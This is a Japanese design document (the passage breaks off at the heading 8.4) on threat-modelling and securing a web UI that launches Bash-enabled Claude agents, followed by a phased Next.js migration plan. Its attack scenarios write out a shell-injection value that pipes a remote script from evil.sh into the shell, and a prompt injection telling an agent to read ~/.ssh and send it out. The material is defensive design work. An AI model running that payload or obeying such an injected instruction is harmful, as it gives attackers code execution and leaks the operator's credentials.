このセクションは、現在 `127.0.0.1:8765` 固定・認証なしで動いている Web UI(`webapp/main.py`)を、Next.js + FastAPI(JSON API + SSE)の2プロセス構成へ刷新するにあたり、**localhost 固定を解く場合の脅威モデルと多層防御**を規定する。リアルタイム監視・SSE 配線そのものはセクション3(SSE/リアルタイム)、エンドポイント一覧の機能設計はセクション2(API 設計)に委ね、ここでは**「誰がそのエンドポイントを叩けるか」の境界**だけを扱う。

結論を先に置く。**推奨は「Tailscale(WireGuard)背後 + 単一 Bearer トークン + 副作用エンドポイントへの CSRF/Origin 強制 + 監査ログ」を最小実装とし、本格運用ではリバースプロキシ(Caddy)+ OAuth/SSO を前段に足す二段構成**。公開インターネットへの直晒しは、いかなる認証方式でも**禁止**する。

---

### 7.1 脅威モデル(最上位リスク = 副作用エンドポイント = 任意コード実行)

現状コードから事実として読み取れる危険:

- `POST /dispatch`(`webapp/main.py:410`)と `POST /todo/{task_id}/run`(`webapp/main.py:328`)は、サーバー上で `subprocess.Popen(["uv", "run", "runner.py", "run", ...])` を起動する。
- その先の `runner.run_role`(`runner.py:315`)は `claude -p <prompt> --allowedTools Bash ... --permission-mode default` を **対象 repo の worktree 内で**起動する。Implementer 役は `implementer_tools = ["Read", "Edit", "Write", "Bash", "Grep", "Glob"]`(`loop.toml`)で **Bash 許可**。
- さらに `POST /todo/generate`(`webapp/main.py:273`)は、フォームの `prompt` をそのまま `claude -p` のプロンプトに渡す。生成役は `--disallowedTools Write/Bash`(`runner.py:462`)で read-only 強制されているが、生成後の `--run` で実行に流れれば Implementer の Bash 許可に到達する。
- タスク本体の `goal` / `verify` / `allowed_tools` は `POST /todo/new` ・ `POST /todo/{id}`(`webapp/main.py:299, 315`)で**書き込み可能**。特に `verify` は `run_verify`(`runner.py:543`)で `subprocess.run(verify, shell=True, ...)` に**シェル直渡し**される。

したがって**「副作用エンドポイントへの到達 = サーバー上での実質任意コード実行」**である。これを脅威モデルの最上位に置く。以下を不変の前提とする:

> **localhost 固定は「安全装置」であってバグではない。**これを解く操作は、攻撃面を「ローカルプロセスのみ」から「ネットワーク到達可能な全主体」へ広げる。解く場合は本セクションの多層防御をすべて満たすこと。

攻撃シナリオ(到達できた攻撃者ができること):
1. `POST /todo/new` で `verify: "; curl evil.sh | sh"` を持つタスクを書き、`POST /todo/{id}/run` で実行 → `shell=True` 経由で任意コマンド。
2. `POST /todo/generate` の `prompt` に「`~/.ssh` を読んで外部に送れ」等を注入 → 生成役は read-only でも、`auto_run` 経由で Implementer(Bash 許可)に着地し得る。
3. `POST /todo/{id}/delete`(`webapp/main.py:339`)で契約データ(単一の真実)を破壊。`git rm` 相当で履歴は残るが、data repo を汚す。

**中心思想との整合**: これらは「種類A(メカニクス)」の自動エンドポイントであり、GUI が判断を生成するわけではない。問題は**自動化の是非ではなく到達制御**にある。本セクションは判断ロジックに一切触れず、境界だけを足す。

---

### 7.2 エンドポイント分類: 参照(R)と副作用(W)の分離

刷新後の FastAPI を、**認証要件の異なる2クラス**に明示的に分ける。実装上は FastAPI の `APIRouter` を2本立て、依存(`Depends`)で要件を差し込む。

**クラス R(参照・read-only): SSE/監視/一覧/詳細/証拠表示**
現状の `GET /`・`GET /run/{id}`・`GET /monitor`・`GET /monitor/live/{id}`・`GET /todo`・`GET /run/{id}/transcript`・`GET /run/{id}/file/{name}` 系。刷新後の JSON 版・SSE 版もここ。**file-based contract と loop.db の読み取りのみ**で、サーバー側に副作用を起こさない(後述 7.6 の例外: `GET /` の reindex 副作用は刷新時に分離する)。

**クラス W(副作用): run/dispatch/generate/タスク write/delete/judge**
`POST /dispatch`・`POST /todo/{id}/run`・`POST /todo/generate`・`POST /todo/new`・`POST /todo/{id}`・`POST /todo/{id}/delete`・`POST /run/{id}/judge`。このうち **run/dispatch/generate は「実質 RCE」クラス、write/delete/judge は「契約データ改変」クラス**。両方とも認証必須だが、後述の権限スコープ(7.4)で**さらに分ける**。

設計ルール:
- **クラス W は全て認証必須 + Origin/CSRF チェック必須**(7.5)。
- **クラス R は認証を「設定で要求/不要を切替可能」**にする(7.4 の `auth.read_scope`)。デフォルトは「localhost なら不要、非 localhost なら要求」。
- 既存の GET エンドポイントのうち `POST` で副作用を持つものは刷新時に HTTP メソッドを正す(`/judge` 等は既に POST)。`GET /` が `_reindex_and_query`(`webapp/main.py:47`)で reindex を起こしている点だけは R の純粋性を壊すので 7.6 で扱う。

JSON 形のエンドポイントメタ(実装者がレジストリとして持つ想定):

```json
{
  "POST /api/dispatch":            { "class": "W", "scope": "execute", "csrf": true },
  "POST /api/tasks/{id}/run":      { "class": "W", "scope": "execute", "csrf": true },
  "POST /api/tasks/generate":      { "class": "W", "scope": "execute", "csrf": true },
  "POST /api/tasks":               { "class": "W", "scope": "write",   "csrf": true },
  "PUT  /api/tasks/{id}":          { "class": "W", "scope": "write",   "csrf": true },
  "DELETE /api/tasks/{id}":        { "class": "W", "scope": "write",   "csrf": true },
  "POST /api/runs/{id}/judge":     { "class": "W", "scope": "write",   "csrf": true },
  "GET  /api/runs":                { "class": "R", "scope": "read",    "csrf": false },
  "GET  /api/runs/{id}":           { "class": "R", "scope": "read",    "csrf": false },
  "GET  /api/runs/{id}/file/{name}": { "class": "R", "scope": "read",  "csrf": false },
  "GET  /api/monitor/stream":      { "class": "R", "scope": "read",    "csrf": false }
}
```

---

### 7.3 認証方式の比較

| 方式 | 実装コスト | 強度 | リモート公開適性 | モバイル適性 | 監査(誰が) |
|---|---|---|---|---|---|
| ① 単一 Bearer トークン | 極小 | 中(漏洩=全権) | 単独では不可、VPN 背後で可 | 良(ヘッダ/Cookie) | 主体識別が弱い(トークン=1人) |
| ② HTTP Basic | 小 | 中(毎回平文 base64、TLS 必須) | 単独では不可 | 可だが UX 悪 | ユーザ名で識別可 |
| ③ リバースプロキシ + OAuth/SSO | 中〜大 | 高 | 単独でも可(ただし VPN 推奨) | 良(ブラウザ OAuth) | 良(IdP のメール/sub) |
| ④ mTLS(クライアント証明書) | 大 | 最高 | 可 | 悪(証明書配布が苦行) | 良(証明書 CN) |

評価:
- **① 単一トークン**は最小実装に最適だが、**主体識別ができない**ため監査要件(7.7「誰が dispatch したか」)を単独では満たせない。トークンに**名前付きの複数トークン**(`{name, token_hash, scope}` の配列)を許す形に拡張すれば、監査の「誰が」をトークン名で代替できる。
- **② Basic** はトークンより優れる点が乏しく(TLS 必須は①も同じ)、ブラウザ Basic ダイアログの UX が悪い。**不採用**。
- **③ プロキシ + OAuth/SSO** は本格運用の正解。Caddy + `caddy-security`(or oauth2-proxy)で IdP(Google/GitHub)認証を**前段で終わらせ**、FastAPI には `X-Forwarded-User` 等の検証済みヘッダだけ渡す。FastAPI 側は「信頼できるプロキシからのヘッダ」を信用する設計にする(=プロキシ以外から直接叩けないよう bind を絞る)。
- **④ mTLS** は単一オペレータ + 数台のデバイスなら最高強度だが、モバイルへの証明書配布・更新が重い。run/dispatch クラスのみ mTLS、というハイブリッドは将来の選択肢として残すが、初手では重い。

**推奨(決定)**:
- **最小実装(フェーズ1)= ① の拡張版(名前付き複数 Bearer トークン)+ Tailscale 背後**。トークンは scope(`read` / `write` / `execute`)を持つ。
- **本格運用(フェーズ2)= ③ Caddy + OAuth/SSO を前段**に足し、トークンは「モバイルアプリ/CLI 用の machine token」として併存させる。
- mTLS は**現時点では採用しない**(open question に残す)。

---

### 7.4 トークンと scope のデータ構造・保管

トークンは `loop.toml` には書かない(loop.toml はエンジン公開 repo に入る可能性がある)。**別ファイル `auth.toml`(engine repo の `.gitignore` 必須、`chmod 600`)**に置くか、環境変数で渡す。**平文トークンは保存せず、ハッシュ(例: `argon2` か最低でも `sha256` + per-token salt)で保持**し、リクエスト時に定数時間比較(`hmac.compare_digest`)する。

`auth.toml`(例、相対パス `auth.toml`):
```toml
[auth]
# read_scope: 参照(クラスR)に認証を要求するか。"localhost"=非localhostのみ要求 / "always" / "never"
read_scope = "localhost"
# 信頼する Origin(CSRF/Origin チェックで許可するフロントのオリジン)
allowed_origins = ["https://loop.example.ts.net"]

[[auth.tokens]]
name = "shuya-laptop"
scope = ["read", "write", "execute"]
hash = "sha256:9f86d0...:salt=ab12"     # 平文は保存しない

[[auth.tokens]]
name = "shuya-phone-monitor"
scope = ["read"]                          # モバイルから監視だけ(7.6)
hash = "sha256:2c26b4...:salt=cd34"
```

FastAPI 側の依存(短いスケッチ、`webapp/auth.py` 新規):
```python
def require_scope(needed: str):
    def dep(request: Request) -> str:
        tok = _extract_token(request)  # Authorization: Bearer / Cookie(SSE用)
        ident = _verify(tok)           # 名前を返す。失敗は None
        if needed == "read" and _read_allowed_without_token(request):
            return ident or "anonymous-local"
        if ident is None or needed not in _scope_of(ident):
            raise HTTPException(401)
        return ident                   # 監査ログに使う主体名
    return dep
```

`_read_allowed_without_token` は `auth.read_scope` と `request.client.host == "127.0.0.1"` を見て判定する。**Tailscale 経由は 127.0.0.1 ではない**(100.x.y.z 等)ため、VPN 背後でも参照にトークンを求められる(`read_scope = "always"` 推奨)。

---

### 7.5 CSRF / Origin / TLS(クラス W の必須ガード)

Next.js フロントから fetch する前提なので、**CSRF 対策はトークンを Cookie ではなく `Authorization` ヘッダで送る方式を基本**にする(カスタムヘッダはクロスサイトの単純リクエストで付かないため、それ自体が CSRF 緩和になる)。ただし SSE は `EventSource` がカスタムヘッダを送れないため Cookie 認証になりがちで、そこに CSRF 面が生じる(7.6)。

クラス W に課す多層:
1. **Origin / Referer チェック**: `Origin` が `auth.allowed_origins` に含まれなければ 403。`Origin` 欠落(=非ブラウザ)はトークン必須なので許容するが、ログに残す。
2. **カスタムヘッダ必須**: クラス W は `X-Loop-CSRF: 1` 等の任意ヘッダを必須にし、無ければ 403。単純フォーム POST を弾く安価な二重化。
3. **TLS 必須**: 非 localhost への bind 時は、Tailscale の TLS 終端(`tailscale cert` / MagicDNS)か Caddy の自動 TLS を前段に置き、**平文 HTTP で外に出さない**。トークンは TLS 上のみ。
4. **bind アドレスの明示**: 刷新後も `uvicorn.run(host=...)` を**設定値**にし、デフォルトは `127.0.0.1`。非 localhost bind は `auth.toml` に有効なトークンが1つ以上ある場合のみ起動時に許可(無認証で 0.0.0.0 bind したら起動時に **fail-closed で停止**)。

短いスケッチ(起動ガード):
```python
host = cfg_host()  # 既定 "127.0.0.1"
if host not in ("127.0.0.1", "::1") and not auth_tokens_present():
    sys.exit("非localhost bind には auth.toml のトークンが必須です(fail-closed)。")
```

---

### 7.6 モバイル要件の分岐:「監視だけ」と「dispatch まで」

要望④(リモート/モバイル)は、**到達させる範囲で要件が二分する**。これを設計上の明示的な分岐にする。

**(a) モバイルから「監視だけ」(scope=read)**
- 必要なのはクラス R(`GET /api/runs`・`GET /api/monitor/stream` SSE・証拠表示)のみ。
- **副作用クラス W はトークン scope で完全に遮断**できる(`read` トークンでは run/dispatch が 401)。
- これが**最も安全なモバイル運用**であり、推奨デフォルト。RCE 露出をゼロに保ったまま外から状況を見られる。
- SSE の認証: `EventSource` はヘッダを送れないため、**短命の signed query token**(`GET /api/monitor/stream?t=<HMAC(expiry)>`)か **HttpOnly + SameSite=Strict Cookie**で認証する。SSE は read-only なので CSRF の実害は小さいが、Cookie 方式なら `SameSite=Strict` で他サイトからの接続を防ぐ。query token 方式はログに残らないよう注意(短命・1回限り)。

**(b) モバイルから「dispatch まで」(scope=execute)**
- これは 7.1 の最上位リスクをモバイルに開く行為。**Tailscale 背後 + execute トークン + Origin チェック + 監査ログ**を全て満たした上でのみ許可。
- 加えて**「実行系の確認ステップ」**を UI/API に挟むことを推奨(例: `POST /api/dispatch` に `confirm: true` を必須化)。ただしこれは**判断の自動入力ではなく、副作用の明示的トリガー**であり中心思想に反しない。
- それでも**公開インターネット直叩きでの dispatch は禁止**。VPN を必須にする。

JSON 形(scope と UI 表示の対応):
```json
{ "device": "phone", "token_scope": ["read"],
  "ui": { "monitor": true, "dispatch_button": false, "task_edit": false } }
```
フロントは**トークン scope を `GET /api/me` で取得し、できない操作のボタンを出さない**(が、最終ガードは必ずサーバ側 `require_scope`。フロント非表示は UX であって防御ではない)。

---

### 7.7 監査ログ(誰がいつ何を起動したか)

副作用クラス W は**全件を追記専用ログに記録**する。これは file-based contract とは別の運用ログであり、loop.db のような使い捨て派生ではなく**それ自体が一次記録**(セキュリティ証跡)。

- 置き場: `data/` ではなく **engine 側 `logs/audit.jsonl`**(`.gitignore`、追記専用、`chmod 600`)。data repo は契約の真実なので運用ログで汚さない。
- 記録項目(1行 = 1 JSON):
```json
{ "ts": "2026-06-16T12:00:00+09:00", "actor": "shuya-phone-monitor",
  "remote": "100.101.102.103", "method": "POST", "path": "/api/tasks/abc/run",
  "scope_required": "execute", "result": "401",
  "origin": "https://loop.example.ts.net" }
```
- `actor` は 7.4 のトークン名(③採用時は IdP のメール)。**「誰が dispatch したか」はトークン名で確定**する。これが①単一トークンを**名前付き複数トークン**に拡張した最大の理由。
- 401/403 も記録する(攻撃検知のため)。
- ミドルウェアで横断的に差す(`@app.middleware("http")`)。SSE 接続の開始/終了も記録。

---

### 7.8 パストラバーサル防止(API 移行後も保つ)

現状の防御を**刷新後も等価以上に維持**する。実装者は移行時に「旧コードの検証が JSON API でも生きているか」を必ず確認すること。

現状の検証箇所(維持対象):
- `GET /run/{id}/file/{name}`(`webapp/main.py:402-407`): `(RUNS / run_id / name).resolve()` の後 `str(p).startswith(str((RUNS / run_id).resolve()))` で**前方一致チェック**。これは `..` を resolve 後に弾く正しい方式。**ただし `startswith` は `runs/abc` に対し `runs/abcd` を誤許可する境界バグがあり得る**ため、刷新時は `Path.resolve().is_relative_to(base.resolve())`(Python 3.9+)に置換することを推奨:
```python
base = (RUNS / run_id).resolve()
p = (base / name).resolve()
if not p.is_relative_to(base) or not p.is_file():
    raise HTTPException(404)
```
- `_safe_id`(`webapp/main.py:123`)と `_SAFE_ID` 正規表現(`webapp/main.py:119`): task_id を `^[A-Za-z0-9][A-Za-z0-9._-]*$` に限定し `/` と先頭 `_`/`.` を禁止。**run_id にも同等の検証を入れる**(現状 `monitor_live` は `"/" in run_id or ".." in run_id`(`webapp/main.py:227`)の弱いチェックのみ。`evidence_file` の resolve 方式に統一する)。
- `name`(証拠ファイル名)も `_SAFE_ID` 相当でホワイトリスト化を追加推奨(`change.patch` / `test-output.txt` / `*.stream.jsonl` / `*.result.json` / `verifier.json` / `transcript.jsonl` のみ許可)。証拠は種類が固定なので**列挙ホワイトリスト**が最も堅い。

`verify` のシェル注入(`runner.py:543` の `shell=True`)については、これは**ローカル単一オペレータが書いた契約の実行**という設計前提に立つもので、リモートで `verify` を書ける主体が増えると危険度が上がる。**緩和策**: クラス W の `write` scope と `execute` scope を分け(7.2)、`verify` を書ける主体(write)と run を起動できる主体(execute)を**トークン単位で分離可能**にしておく。`shell=True` 自体の撤廃は実行系のネイティブ委譲方針と干渉するため、ここでは scope 分離による緩和に留める。

---

### 7.9 ネットワーク境界(多層防御の全体像)

```
[モバイル/別PC] --TLS--> [Tailscale(WireGuard)mesh] --> [Caddy(自動TLS/OAuth前段)]
                                                              |
                                                     127.0.0.1 のみ bind
                                                              v
                                          [uvicorn: FastAPI JSON+SSE] -- import --> runner/loopdb
                                                              ^
                                                     [Next.js(別プロセス)] が同一ホストから叩く
```

層:
1. **公開インターネット直晒し禁止**(絶対)。ポートフォワード/トンネル(ngrok 等の恒久公開)も禁止。
2. **Tailscale/WireGuard を必須の最外殻**にする。デバイスは tailnet に参加した端末のみ。これだけで「ネットワーク到達可能な全主体」を**自分の tailnet 内に限定**できる。
3. その内側で **Caddy(フェーズ2)が TLS 終端 + OAuth**。uvicorn と Next.js は **`127.0.0.1` のみに bind** し、外からは Caddy 経由でしか触れない。
4. 最内で **FastAPI のトークン/scope/CSRF/監査**(7.4-7.7)。

この4層により、**どれか1層が破れても即 RCE には至らない**。VPN だけ・トークンだけ・プロキシだけのいずれの単層も不採用。

---

### 7.10 中心思想との整合(明示)

- **「GUI は判断を生成・要約・推奨・自動入力しない」**: 本セクションは認証・到達制御のみで、判断ロジックに触れない。`POST /api/dispatch?confirm=true` の確認ステップ(7.6b)は副作用の明示トリガーであり、判断の自動入力ではない。
- **「file-based contract が単一の真実」**: 認証情報(`auth.toml`)と監査ログ(`logs/audit.jsonl`)は**契約データではない**ため `data/` に置かず engine 側に分離(7.4, 7.7)。data repo を運用メタで汚さない。
- **「loop.db は使い捨て」**: 認証・監査は loop.db に**一切入れない**(reindex で消えると証跡が消えるため)。loop.db は従来どおり MD 派生の参照インデックスに留める。
- **auto_commit の race(セクション5の論点)**: リモート公開で run を増やすと data/ への commit 競合が増える。本セクションは「到達主体を増やすこと」がその race を悪化させる経路でもあると指摘し、**並列実行は別セクションの直列ロック解決が前提**である旨を参照に留める(ここでは解かない)。

---

### 7.11 実装フェーズ(着手順)

1. **bind を設定値化 + fail-closed 起動ガード**(7.5-4)。デフォルト挙動は現状維持(`127.0.0.1`)で無害に入れられる。
2. **`webapp/auth.py`(トークン/scope/`require_scope` 依存)+ `auth.toml`**(7.4)。クラス W に `Depends(require_scope("write"|"execute"))` を付ける。
3. **Origin/CSRF ミドルウェア + 監査ミドルウェア**(7.5, 7.7)。
4. **パストラバーサル検証を `is_relative_to` + 証拠ファイル名ホワイトリストに統一**(7.8)。これは公開前でも単独で価値がある堅牢化。
5. **Tailscale 背後で非 localhost bind を実検証**(7.9 層2-3)。
6. **(フェーズ2)Caddy + OAuth 前段**(7.3 ③)。

---

<a id="8"></a>

## 8. 段階的移行フェーズと超並列実装計画

本セクションは「既存 Jinja UI を一切壊さずに Next.js へ移行する」ためのフェーズ分割と、`ultracode`(loop 自身 / 複数エージェント)で超並列に実装するための作業分解・依存グラフ・worktree 隔離戦略を定める。API のエンドポイント署名や型の正本はセクション2(API 契約)、SSE イベント形はセクション5(SSE 監視)、認証はセクション6(認証/リモート)、ダッシュボードはセクション7に委ねる。ここでは「**いつ・どの順で・どこまで並列で**作るか」と「各フェーズで常に動くものが残る不変条件」に集中する。

### 8.0 設計の出発点(現状の事実)

接地した実コードは以下のとおり(推測ではない)。移行計画はこの事実に依存する。

- `webapp/main.py`(419行)は `sys.path.insert` 後 `import loopdb` / `import runner` し、**FastAPI が Python 関数を直接呼ぶ**。dispatch 系のみ `subprocess.Popen(["uv","run","runner.py","run", tid], cwd=ROOT)` で別プロセス起動(`/dispatch`・`/todo/{id}/run`・`/todo/generate`)。
- 真実の源は契約ファイル。判断の書き込みは `runner.write_judgment(run_id, {...}, cfg)`(`JUDGMENT_FIELDS = trust/risk/checks/learning`)、TODO 書き込みは `runner.write_task` + `runner.auto_commit(runner.DATA, [p], msg)`。`loop.db` は `loopdb.reindex` で全件再生成される使い捨てインデックス(`index()` 系は authoritative でない)。
- ライブ監視の唯一のソースは `data/.run.lock`(`runner.write_run_status(**fields)` が `{run_id, phase, started_at, ...}` を JSON で書く)と per-run の `runs/<id>/<role>.stream.jsonl`。現状は `meta http-equiv refresh` でポーリング。
- run は `data/.run.lock` を `os.O_EXCL` で取り**直列化**(`cmd_run`)。並列 run は別トラック(§8.5)。
- 現行8ページ: `/`・`/run/<id>`・`/run/<id>/transcript`・`/todo`・`/todo/new`・`/todo/<id>`・`/monitor`・`/monitor/live/<id>`。

**この事実から導かれる移行の核心**: FastAPI は捨てない。`webapp/main.py` の各ハンドラは「`runner`/`loopdb` の薄い呼び出し + テンプレ描画」なので、**テンプレ描画を `JSONResponse` に差し替えるだけ**で JSON API になる。ロジックの二重化は起きない。Jinja 版は別 prefix(`/legacy`)へ退避させれば、Next が完成するまで生かしておける。

### 8.1 フェーズ分割と「常に動く」不変条件

各フェーズの完了時点で **必ず人間が triage を継続できる経路が1本以上残る** ことを不変条件(invariant)とする。これを破るフェーズは存在しない。

| Phase | 目的 | 完了時に「動くもの」 | 既存 Jinja UI |
|---|---|---|---|
| **P0** | FastAPI を JSON API + SSE 土台 + 認証土台へ。**UI は触らない** | Jinja UI(全機能)+ JSON API が**並存** | そのまま `/legacy/*` で温存 |
| **P1** | Next コア(run 一覧 / 詳細 / 判断フォーム / TODO) | Next の triage 経路 + Jinja の triage 経路の**二重化** | 温存(フォールバック) |
| **P2** | SSE ライブ監視 + 並行 run 同時表示 | Next 上で near-real-time 監視 | 温存(`/legacy/monitor`) |
| **P3** | 分析ダッシュボード(DuckDB レンズ) | Next にダッシュボード追加 | 温存 |
| **P4** | 認証 + リモート/モバイル | 認証付き公開経路 | **撤去判断**(§8.1.6) |
| **別トラック T** | runner 並列化(GUI 非依存) | 直列のまま動き続ける | 無関係 |

**推奨(決定): P0 を「UI を一切変えない純粋な API 追加フェーズ」として独立させる。** 理由 — P0 が API 契約を凍結(§8.3)するまでフロント各ワークストリームは着手できない一方、P0 自体は Jinja を触らないので「既存が壊れない」ことが自明に保証される。P0 と P1 を混ぜると「JSON 化のついでに Jinja を消す」誘惑が生じ、不変条件を破る。

#### 8.1.1 Phase 0 — JSON API + SSE 土台 + 認証土台(UI 温存)

`webapp/` を以下に再編する(相対パス)。

```
webapp/
  main.py          # ASGI エントリ。app を組み立てるだけに痩せさせる
  legacy.py        # 現 main.py のハンドラをそっくり移設(/legacy prefix の APIRouter)
  api/
    __init__.py    # api_router: APIRouter(prefix="/api")
    runs.py        # GET /api/runs, GET /api/runs/{id}, POST /api/runs/{id}/judge ...
    tasks.py       # GET/POST /api/tasks ...
    dispatch.py    # POST /api/dispatch, POST /api/tasks/{id}/run
    monitor.py     # GET /api/monitor, GET /api/stream (SSE)
  schemas.py       # Pydantic モデル(レスポンス型の正本 = OpenAPI 源)
  auth.py          # 認証土台(P0 は no-op ミドルウェア。§8.1.5)
  templates/       # 既存 Jinja(無改造)
```

`main.py` の骨子(コードスケッチ):

```python
app = FastAPI(title="loop")
app.add_middleware(AuthMiddleware)      # P0: 127.0.0.1 のみ通す no-op(§8.1.5)
app.include_router(api.api_router)      # /api/* = 新 JSON 面
app.include_router(legacy.router)       # /legacy/* = 現 Jinja(退避)
# 旧トップ "/" は当面 legacy.index に 307 で寄せ、P1 完了で Next へ向ける
```

各 JSON ハンドラは**既存ハンドラの最後の `templates.TemplateResponse(...)` を `return SchemaModel(...)` に差し替えるだけ**。例(`/` → `GET /api/runs`、現 `_reindex_and_query` を再利用):

```python
@router.get("/runs", response_model=list[RunRow])
def list_runs(verdict: str | None = None, reviewed: str | None = None, task: str | None = None):
    rows, _ = main_helpers.reindex_and_query(verdict, reviewed, task)  # 既存ロジック流用
    return [RunRow(**r) for r in rows]
```

判断書き込みは**現行の硬い制約をそのまま継承**する。`POST /api/runs/{id}/judge` は受け取った `trust/risk/checks/learning` を**そのまま** `runner.write_judgment` に渡すだけで、サーバ側で文章生成・要約・補完を一切行わない(§8.4 の禁止事項)。

SSE 土台(`GET /api/stream`)は P0 で**エンドポイントと最小イベント1種だけ**置く。中身の本実装(role別 transcript tail・並行 run)は P2 だが、**経路と `EventSourceResponse` の枠だけ先に凍結**しておくことで P2 のフロントが P0 完了直後に着手可能になる(§8.3)。

不変条件チェック(P0 受け入れ): `just web` 起動後 `/legacy/` が現行8ページ全機能で動く + `curl /api/runs` が JSON を返す + `curl -N /api/stream` がイベントを1本以上流す。

#### 8.1.2 Phase 1 — Next コア(一覧 / 詳細 / 判断 / TODO)

Next.js(App Router)で **triage に必要な最小4面**を作る: run 一覧・run 詳細(事実要約 + 証拠 + 判断フォーム)・TODO 一覧・TODO 編集/新規。SSE もダッシュボードもこの段階では入れない(静的フェッチで足りる面に絞る)。

ディレクトリ(新規 `web/` を engine 直下に作る。Python の `webapp/` と分離):

```
web/                         # Next.js (App Router)
  app/
    runs/page.tsx            # 一覧
    runs/[id]/page.tsx       # 詳細 + 判断フォーム
    tasks/page.tsx
    tasks/[id]/page.tsx
    tasks/new/page.tsx
  lib/api.ts                 # 型付き fetch クライアント(§8.2 共有面)
  lib/types.ts               # OpenAPI 生成 or 手書き型
  components/ui/             # shadcn/ui
```

**判断フォームは prefill のみ・生成ゼロ**: 詳細ページは `GET /api/runs/{id}` が返す `judgment: {trust,risk,checks,learning}`(現 `runner.parse_judgment` 由来)を**そのまま** `<Textarea defaultValue>` に流す。placeholder に AI 補完・サジェスト・「例文」を出さない。送信は `POST /api/runs/{id}/judge` に**人間が打った文字列をそのまま**送る。

不変条件チェック(P1 受け入れ): Next 上で run を開き判断を保存 → `runs/<id>.md` の判断セクションが更新され `auto_commit` される(= 契約ファイルが正本)。**同じ run を `/legacy/run/<id>` で開いても同じ判断が見える**(二重経路の一致 = フォールバック保証)。

#### 8.1.3 Phase 2 — SSE ライブ + 並行 run 同時表示

P0 で凍結した `GET /api/stream` を本実装。`data/.run.lock`(`write_run_status` 由来)の変化と `runs/<id>/<role>.stream.jsonl` の tail を SSE で配信。**並行 run 同時表示**は「複数 `run_id` を `event: run.phase` で多重化する」UI(§5)。現状 run は直列なので「同時に2件流れる」状況は別トラック T 完了後だが、**UI は最初から複数 run を配列で扱う**前提で作る(後で T が入っても改修不要)。

不変条件チェック: T 未完(直列)でも、1 run のフェーズ遷移が near-real-time で Next に出る + `/legacy/monitor/live/<id>` が引き続きポーリングで動く。

#### 8.1.4 Phase 3 — 分析ダッシュボード

DuckDB(`stats.py` / `queries/*.sql`)を**読み取り専用レンズ**として API 化(`GET /api/stats/*`)し Next で可視化。**ここは集計の表示であって判断ではない**。「成功率が低いので X を直すべき」等の**推奨文を生成しない**。数字・分布・時系列の事実提示まで(§8.4)。`loop.db`/DuckDB は使い捨てなので、ダッシュボードは「reindex すれば再現できる」状態のみ表示し、独自の集計結果を永続化しない。

#### 8.1.5 Phase 4 — 認証 + リモート/モバイル

詳細は§6。移行計画上の要点のみ:

- P0 で入れた `AuthMiddleware` を no-op から実体へ差し替え(P0〜P3 では `127.0.0.1` 固定の安全装置を保持)。
- **リモート公開は実質リモートコード実行の露出**(`/api/dispatch`・`/api/tasks/{id}/run`・`/api/tasks/generate` がサーバ上で Bash 許可の `claude -p` を起動する)。よって P4 は「読み取り+判断書き込み」面と「dispatch/生成」面を**認可レベルで分離**する。リモートから許すのは前者まで、後者は localhost か明示的な強い認可の背後に置く(§6 に委譲)。

#### 8.1.6 Jinja 撤去の判断点

Jinja は P4 完了まで `/legacy/*` で温存。撤去は P4 受け入れ後に**別の独立タスク**として行い、フェーズには含めない(「移行が動く」と「旧経路を消す」を混ぜない)。撤去時は `webapp/legacy.py` と `webapp/templates/` の削除のみで、`webapp/api/` と `runner`/`loopdb` には触れない(疎結合の確認になる)。

### 8.2 共有面を先に固定する(並列解禁の前提)

複数エージェントが衝突せず並走するには、**全員が依存する共有面を最初に1人で作り凍結**する。共有面は3つ。

1. **API 契約(`webapp/schemas.py` + 自動生成 OpenAPI)** — レスポンス/リクエストの Pydantic モデル正本。
2. **TS 型 + API クライアント(`web/lib/types.ts` + `web/lib/api.ts`)** — OpenAPI から `openapi-typescript` で生成し、`api.ts` は薄い型付き fetch ラッパ。
3. **shadcn/ui 基盤(`web/components/ui/` + Tailwind 設定 + `web/app/layout.tsx`)** — デザイントークン・共通レイアウト・Provider。

**推奨(決定): 共有面の確定を「Phase 0.5(ゲート)」として独立タスク化し、ここが merge されるまでフロント各ページの並列着手を禁止する。** 共有面は意図的に1ワークストリーム(1 worktree)で直列に作る。ここを並列化すると型衝突で全員が止まる。

型生成の向き(決定): **OpenAPI を源に TS 型を生成する一方向**にする(`schemas.py` が正本)。理由 — FastAPI は OpenAPI を自動出力でき、`runner`/`loopdb` の戻り値(dict / sqlite3.Row)を Pydantic で受ける箇所が既に API の境界だから。手書き二重定義は禁止。

```sh
# 共有面確定後、フロント着手前に1回回す(CI でも検証)
uv run webapp/main.py &        # OpenAPI を /openapi.json で公開
npx openapi-typescript http://127.0.0.1:8765/openapi.json -o web/lib/types.ts
```

### 8.3 依存グラフ(何が何をブロックするか)

```
[T 別トラック: runner並列化] ── GUI と独立 ── 影響: P2 の「同時2件」が実データで出るのは T 後
        │ (data/ commit race / index.lock。§8.5)
        ▼
   (なし。GUI をブロックしない)

[P0: JSON API + SSE枠 + 認証土台(no-op)]
        │  凍結する: OpenAPI / SSEイベント形 / 認証ミドルウェア境界
        ▼
[0.5 共有面ゲート: schemas → types.ts/api.ts → shadcn基盤]  ← ★ここが全フロントの解禁鍵
        ├──────────────┬───────────────┬────────────────┐
        ▼              ▼               ▼                ▼
   [P1-A 一覧]   [P1-B 詳細+判断]  [P1-C TODO]      [P2 SSEライブ]   [P3 ダッシュボード]   [P4 認証フロント]
   (並列)         (並列)            (並列)           (並列*)          (並列*)              (並列*)
                                                    *SSE/stats/auth は
                                                     P0で枠が凍結済みなら
                                                     P1 と同時着手可
```

**unblock 構造の核心(決定)**: P0 で API 契約・SSE イベント形・認証境界の**3つを凍結**しておけば、`P1-A / P1-B / P1-C / P2 / P3 / P4` の6ワークストリームは **0.5 共有面ゲート完了直後に全て同時着手できる**。フェーズ番号(P1→P2→…)は「動くものが残る出荷順序」であって**実装の着手順序ではない**。契約さえ凍れば実装は扇形に展開する。これが「超並列」の本体。

ブロッキング関係を表で明示:

| ワークストリーム | 依存(これが終わるまで着手不可) | 並列可能な相手 |
|---|---|---|
| P0 API/SSE枠/認証土台 | なし | T |
| 0.5 共有面ゲート | P0 | (なし。単独直列) |
| P1-A 一覧 / P1-B 詳細+判断 / P1-C TODO | 0.5 | 相互に並列 |
| P2 SSEライブ | 0.5(SSEイベント形は P0 で凍結済) | P1-* / P3 / P4 |
| P3 ダッシュボード | 0.5 + `GET /api/stats/*`(P0で枠) | P1-* / P2 / P4 |
| P4 認証フロント | 0.5 + 認証境界(P0で凍結) | P1-* / P2 / P3 |
| T runner並列化 | なし | 全部 |

### 8.4 worktree 隔離(衝突しない単位の切り方)

